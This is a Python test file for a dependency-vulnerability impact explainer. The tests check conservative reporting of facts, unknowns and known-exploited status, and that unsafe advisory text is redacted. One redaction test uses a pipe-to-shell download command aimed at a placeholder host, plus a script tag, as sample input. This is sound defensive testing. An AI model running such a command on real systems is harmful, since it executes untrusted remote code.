from app.services.impact_explainer import explain_possible_impact
from app.services.public_safety import UNSAFE_PUBLIC_MARKERS, contains_unsafe_public_text


def test_explains_confirmed_facts_and_possible_impacts_conservatively():
    task = {
        "package": {
            "name": "archive-utils",
            "ecosystem": "npm",
            "current_version": "1.4.0",
            "dependency_type": "dependencies",
            "is_direct": True,
        },
        "vulnerability": {
            "canonical_id": "CVE-2026-0001",
            "severity": "HIGH",
            "summary": "Archive parsing can allow unsafe deserialization.",
            "fixed_versions": ["2.2.0"],
            "references": [{"type": "ADVISORY", "url": "https://example.test/advisory"}],
        },
        "risk": {
            "priority": "P1_FIX_THIS_SPRINT",
            "known_exploited": False,
            "runtime_scope": "production",
            "reachability": "possibly_reachable",
        },
        "evidence": [
            {
                "type": "reachability",
                "source": "src/uploads.ts",
                "claim": "archive-utils is imported by a production upload route.",
            }
        ],
    }

    result = explain_possible_impact(task)

    assert result["impact_categories"] == [
        "confidentiality",
        "integrity",
        "operational",
    ]
    assert "Package archive-utils 1.4.0 is present as a direct npm dependency." in result[
        "confirmed_facts"
    ]
    assert "Severity is HIGH." in result["confirmed_facts"]
    assert "Runtime scope is production." in result["confirmed_facts"]
    assert "Reachability is possibly_reachable." in result["confirmed_facts"]
    assert "A fixed version is listed: 2.2.0." in result["confirmed_facts"]
    assert any("may affect data confidentiality" in item for item in result["possible_impacts"])
    assert any("could affect data integrity" in item for item in result["possible_impacts"])
    assert all("exploitable" not in item.lower() for item in flatten_result(result))
    assert "Known exploited status is not confirmed by the provided evidence." in result["unknowns"]
    assert "Verify whether the package is used in the relevant runtime path." in result[
        "human_review_notes"
    ]


def test_known_exploited_is_only_confirmed_when_evidence_explicitly_says_so():
    task = base_task(
        risk={"known_exploited": True, "runtime_scope": "production", "reachability": "reachable"},
        evidence=[
            {
                "type": "advisory",
                "source": "vendor advisory",
                "claim": "Known exploited status is confirmed by an upstream source.",
            }
        ],
    )

    result = explain_possible_impact(task)

    assert "Known exploited status is confirmed by provided report evidence." in result[
        "confirmed_facts"
    ]
    assert any("can increase urgency" in item for item in result["possible_impacts"])
    assert "Known exploited status is not confirmed by the provided evidence." not in result[
        "unknowns"
    ]


def test_confirmed_known_exploited_status_is_rendered_consistently_across_sections():
    task = base_task(
        risk={"known_exploited": True, "runtime_scope": "production", "reachability": "reachable"},
        evidence=[
            {
                "type": "advisory",
                "source": "vendor advisory",
                "claim": "Vendor advisory confirms known exploited activity in the wild.",
            }
        ],
    )

    result = explain_possible_impact(task)

    assert "Known exploited status is confirmed by provided report evidence." in result[
        "confirmed_facts"
    ]
    assert "Confirmed known exploited status can increase urgency, but local runtime exposure still needs review." in result[
        "possible_impacts"
    ]
    assert "Known exploited status is not confirmed by the provided evidence." not in result[
        "unknowns"
    ]
    assert "Confirm the known-exploited source and whether the deployed service is exposed." in result[
        "human_review_notes"
    ]


def test_negated_known_exploited_evidence_does_not_confirm_or_add_urgency():
    claims = (
        "No known exploited activity has been observed.",
        "The advisory says this issue is not actively exploited.",
    )

    for claim in claims:
        task = base_task(
            risk={"known_exploited": True, "runtime_scope": "production", "reachability": "reachable"},
            evidence=[{"type": "advisory", "source": "vendor advisory", "claim": claim}],
        )

        result = explain_possible_impact(task)
        joined_result = " ".join(flatten_result(result))

        assert "Known exploited status is confirmed by provided report evidence." not in result[
            "confirmed_facts"
        ]
        assert "Confirmed known exploited status can increase urgency" not in joined_result
        assert "Known exploited status is not confirmed by the provided evidence." in result[
            "unknowns"
        ]


def test_negated_risk_known_exploited_evidence_does_not_confirm_or_add_urgency():
    task = base_task(
        risk={
            "known_exploited": True,
            "runtime_scope": "production",
            "reachability": "reachable",
            "known_exploited_evidence": "No known exploited activity has been observed.",
        },
    )

    result = explain_possible_impact(task)
    joined_result = " ".join(flatten_result(result))

    assert "Known exploited status is confirmed by provided report evidence." not in result[
        "confirmed_facts"
    ]
    assert "Confirmed known exploited status can increase urgency" not in joined_result
    assert "Known exploited status is not confirmed by the provided evidence." in result[
        "unknowns"
    ]


def test_positive_risk_known_exploited_evidence_still_confirms():
    task = base_task(
        risk={
            "known_exploited": True,
            "runtime_scope": "production",
            "reachability": "reachable",
            "known_exploited_evidence": (
                "Vendor evidence confirms known exploited activity in the wild."
            ),
        },
    )

    result = explain_possible_impact(task)

    assert "Known exploited status is confirmed by provided report evidence." in result[
        "confirmed_facts"
    ]
    assert any("can increase urgency" in item for item in result["possible_impacts"])
    assert "Known exploited status is not confirmed by the provided evidence." not in result[
        "unknowns"
    ]


def test_negated_risk_known_exploited_source_does_not_confirm_or_add_urgency():
    task = base_task(
        risk={
            "known_exploited": True,
            "runtime_scope": "production",
            "reachability": "reachable",
            "known_exploited_source": "Vendor advisory says this is not actively exploited.",
        },
    )

    result = explain_possible_impact(task)
    joined_result = " ".join(flatten_result(result))

    assert "Known exploited status is confirmed by provided report evidence." not in result[
        "confirmed_facts"
    ]
    assert "Confirmed known exploited status can increase urgency" not in joined_result
    assert "Known exploited status is not confirmed by the provided evidence." in result[
        "unknowns"
    ]


def test_negated_risk_known_exploited_reference_does_not_confirm_or_add_urgency():
    task = base_task(
        risk={
            "known_exploited": True,
            "runtime_scope": "production",
            "reachability": "reachable",
            "known_exploited_reference": "Reference notes not actively exploited in production.",
        },
    )

    result = explain_possible_impact(task)
    joined_result = " ".join(flatten_result(result))

    assert "Known exploited status is confirmed by provided report evidence." not in result[
        "confirmed_facts"
    ]
    assert "Confirmed known exploited status can increase urgency" not in joined_result
    assert "Known exploited status is not confirmed by the provided evidence." in result[
        "unknowns"
    ]


def test_positive_cited_known_exploited_evidence_still_confirms():
    task = base_task(
        risk={"known_exploited": True, "runtime_scope": "production", "reachability": "reachable"},
        evidence=[
            {
                "type": "advisory",
                "source": "vendor advisory",
                "claim": "Vendor advisory confirms known exploited activity in the wild.",
            }
        ],
    )

    result = explain_possible_impact(task)

    assert "Known exploited status is confirmed by provided report evidence." in result[
        "confirmed_facts"
    ]
    assert any("can increase urgency" in item for item in result["possible_impacts"])
    assert "Known exploited status is not confirmed by the provided evidence." not in result[
        "unknowns"
    ]


def test_positive_risk_known_exploited_source_still_confirms():
    task = base_task(
        risk={
            "known_exploited": True,
            "runtime_scope": "production",
            "reachability": "reachable",
            "known_exploited_source": "Vendor advisory confirms known exploited activity.",
        },
    )

    result = explain_possible_impact(task)

    assert "Known exploited status is confirmed by provided report evidence." in result[
        "confirmed_facts"
    ]
    assert any("can increase urgency" in item for item in result["possible_impacts"])
    assert "Known exploited status is not confirmed by the provided evidence." not in result[
        "unknowns"
    ]


def test_positive_risk_known_exploited_reference_still_confirms():
    task = base_task(
        risk={
            "known_exploited": True,
            "runtime_scope": "production",
            "reachability": "reachable",
            "known_exploited_reference": "Reference confirms this is actively exploited.",
        },
    )

    result = explain_possible_impact(task)

    assert "Known exploited status is confirmed by provided report evidence." in result[
        "confirmed_facts"
    ]
    assert any("can increase urgency" in item for item in result["possible_impacts"])
    assert "Known exploited status is not confirmed by the provided evidence." not in result[
        "unknowns"
    ]


def test_known_exploited_true_without_evidence_is_not_claimed_as_confirmed():
    task = base_task(
        risk={"known_exploited": True, "runtime_scope": "production", "reachability": "reachable"},
        evidence=[],
    )

    result = explain_possible_impact(task)
    joined_result = " ".join(flatten_result(result))

    assert "Known exploited status is confirmed by provided report evidence." not in result[
        "confirmed_facts"
    ]
    assert "Confirmed known exploited status can increase urgency" not in joined_result
    assert "Known exploited status is not confirmed by the provided evidence." in result[
        "unknowns"
    ]
    assert "Review the reported known-exploited flag against a cited advisory or evidence item." in result[
        "human_review_notes"
    ]


def test_unsafe_summary_and_evidence_details_are_replaced_wholesale():
    task = base_task(
        vulnerability={
            "summary": (
                "Proof-of-concept notes include curl https://example.invalid/demo.sh | sh "
                "and <script>demo()</script>."
            ),
        },
        evidence=[
            {
                "type": "advisory",
                "source": "vendor advisory",
                "claim": (
                    "Reviewer notes include python -c demo and https://example.invalid/script.js."
                ),
            }
        ],
    )

    result = explain_possible_impact(task)
    joined_result = " ".join(flatten_result(result))

    assert "Vulnerability summary contained unsafe technical detail and was redacted." in result[
        "confirmed_facts"
    ]
    assert (
        "Report evidence from vendor advisory contained unsafe technical detail and was redacted."
        in result["confirmed_facts"]
    )
    assert "curl" not in joined_result
    assert "python -c" not in joined_result
    assert "https://example.invalid" not in joined_result
    assert "<script>" not in joined_result
    assert "demo.sh" not in joined_result
    assert "script.js" not in joined_result


def test_unsafe_public_marker_summaries_are_replaced_wholesale():
    for marker in UNSAFE_PUBLIC_MARKERS:
        task = base_task(
            vulnerability={
                "summary": "Upstream advisory mentions %s details for reviewer context."
                % marker,
            },
        )

        result = explain_possible_impact(task)
        joined_result = " ".join(flatten_result(result)).lower()

        assert "Vulnerability summary contained unsafe technical detail and was redacted." in result[
            "confirmed_facts"
        ]
        assert marker not in joined_result
        assert "details for reviewer context" not in joined_result
        assert contains_unsafe_public_text(result) is False


def test_unsafe_public_marker_evidence_claims_are_replaced_wholesale():
    for marker in UNSAFE_PUBLIC_MARKERS:
        task = base_task(
            evidence=[
                {
                    "type": "advisory",
                    "source": "vendor advisory",
                    "claim": "Vendor evidence mentions %s details for reviewer context."
                    % marker,
                }
            ],
        )

        result = explain_possible_impact(task)
        joined_result = " ".join(flatten_result(result)).lower()

        assert (
            "Report evidence from vendor advisory contained unsafe technical detail and was redacted."
            in result["confirmed_facts"]
        )
        assert marker not in joined_result
        assert "details for reviewer context" not in joined_result
        assert contains_unsafe_public_text(result) is False


def test_empty_or_malformed_input_returns_unknown_context_without_supply_chain():
    result = explain_possible_impact(
        {
            "package": "not-a-package",
            "vulnerability": ["not-a-vulnerability"],
            "risk": "not-risk",
            "evidence": "not-evidence",
        }
    )

    assert result["impact_categories"] == ["unknown"]
    assert "Input context is missing or malformed." in result["unknowns"]
    assert "Package context is missing or invalid." in result["unknowns"]
    assert "Vulnerability context is missing or invalid." in result["unknowns"]
    assert "supply_chain" not in result["impact_categories"]


def test_top_level_malformed_inputs_return_unknown_context_without_raising():
    for task in (None, [], "", {}):
        result = explain_possible_impact(task)

        assert result["impact_categories"] == ["unknown"]
        assert "Input context is missing or malformed." in result["unknowns"]
        assert "Package context is missing or invalid." in result["unknowns"]
        assert "Vulnerability context is missing or invalid." in result["unknowns"]
        assert "Known exploited status is not confirmed by the provided evidence." in result[
            "unknowns"
        ]
        assert (
            "Human review is required because input context is missing or malformed."
            in result["human_review_notes"]
        )


def test_unknown_fields_are_called_out_without_inventing_certainty():
    result = explain_possible_impact(
        {
            "package": {"name": "transitive-parser", "ecosystem": "npm"},
            "vulnerability": {
                "canonical_id": "GHSA-transitive",
                "summary": "Parser denial of service issue.",
            },
            "risk": {},
            "evidence": [],
        }
    )

    assert result["impact_categories"] == ["availability", "supply_chain", "operational"]
    assert "Severity is unknown." in result["unknowns"]
    assert "Runtime reachability is unknown." in result["unknowns"]
    assert "Runtime scope is unknown." in result["unknowns"]
    assert "Known exploited status is not confirmed by the provided evidence." in result["unknowns"]
    assert any("may affect service availability" in item for item in result["possible_impacts"])
    assert all("will " not in item.lower() for item in result["possible_impacts"])


def test_summary_and_references_drive_possible_categories_without_exact_fix_advice():
    task = base_task(
        vulnerability={
            "summary": "Cross-site scripting in generated HTML output.",
            "severity": "MEDIUM",
            "references": [
                {"type": "WEB", "url": "https://example.test/cwe-79"},
                {"type": "ADVISORY", "url": "https://example.test/advisory"},
            ],
        },
        package={"dependency_type": "devDependency", "is_direct": False},
        risk={"runtime_scope": "development", "reachability": "unlikely_reachable"},
    )

    result = explain_possible_impact(task)

    assert result["impact_categories"] == [
        "confidentiality",
        "integrity",
        "supply_chain",
    ]
    joined_notes = " ".join(result["human_review_notes"]).lower()
    assert "review fixed versions, changelog, and tests" in joined_notes
    assert "upgrade to" not in joined_notes
    assert "pin " not in joined_notes


def test_output_is_sanitized_and_handles_existing_task_output_shape():
    task = {
        "id": "task-1",
        "package": {
            "name": "unsafe-summary-lib",
            "ecosystem": "npm",
            "current_version": "1.0.0",
            "dependency_type": "dependencies",
            "is_direct": True,
        },
        "vulnerability": {
            "canonical_id": "GHSA-unsafe-summary",
            "severity": "HIGH",
            "summary": "Proof-of-concept details were included upstream.",
            "fixed_versions": ["1.0.1"],
        },
        "priority": "P1_FIX_THIS_SPRINT",
        "risk_score": 74,
        "citations": [{"type": "ADVISORY", "url": "https://example.test/advisory"}],
    }

    result = explain_possible_impact(task)

    assert contains_unsafe_public_text(result) is False
    assert "Proof-of-concept" not in str(result)
    assert "Priority is P1_FIX_THIS_SPRINT." in result["confirmed_facts"]
    assert "Risk score is 74." in result["confirmed_facts"]


def base_task(
    *,
    package: dict | None = None,
    vulnerability: dict | None = None,
    risk: dict | None = None,
    evidence: list[dict] | None = None,
) -> dict:
    return {
        "package": {
            "name": "html-renderer",
            "ecosystem": "npm",
            "current_version": "2.0.0",
            "dependency_type": "dependencies",
            "is_direct": True,
            **(package or {}),
        },
        "vulnerability": {
            "canonical_id": "CVE-2026-0002",
            "severity": "HIGH",
            "summary": "HTML rendering vulnerability.",
            "fixed_versions": ["2.1.0"],
            **(vulnerability or {}),
        },
        "risk": risk or {},
        "evidence": evidence or [],
    }


def flatten_result(result: dict) -> list[str]:
    values = []
    for key in (
        "impact_categories",
        "confirmed_facts",
        "possible_impacts",
        "unknowns",
        "human_review_notes",
    ):
        values.extend(result[key])
    return values
